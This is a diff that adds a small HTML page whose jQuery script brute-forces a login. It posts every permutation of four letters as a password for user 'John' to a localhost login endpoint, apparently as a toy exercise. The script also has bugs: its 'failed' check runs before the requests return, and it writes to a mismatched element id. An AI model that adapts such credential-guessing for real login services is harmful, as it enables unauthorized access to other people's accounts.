@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="combinatorics.js"></script>
+
+</head>
+
+<body>
+    <h1>Please wait !! Getting Password</h1>
+    <p id="data"></p>
+    <p id="error"></p>
+</body>
+
+<script>
+    cmb = Combinatorics.permutationCombination(['a', 'c', 'b', 'd']);
+    var userId = "John"
+    var flag = false;
+    cmb.forEach(function (combination) {
+        var password = combination.join('')
+        $.post('http://localhost:3000/login', { userId: userId, password: password }, function (result, err) {
+            if (result == true) {
+                flag = true
+                $('#data').text(`Password for userId "${userId}"  is "${password}"`)
+                $('#error').text('')
+            }
+        });
+
+    });
+    if (flag == false) {
+        $('#err').text('Can not crack down password')
+    }
+</script>
+
+</html>
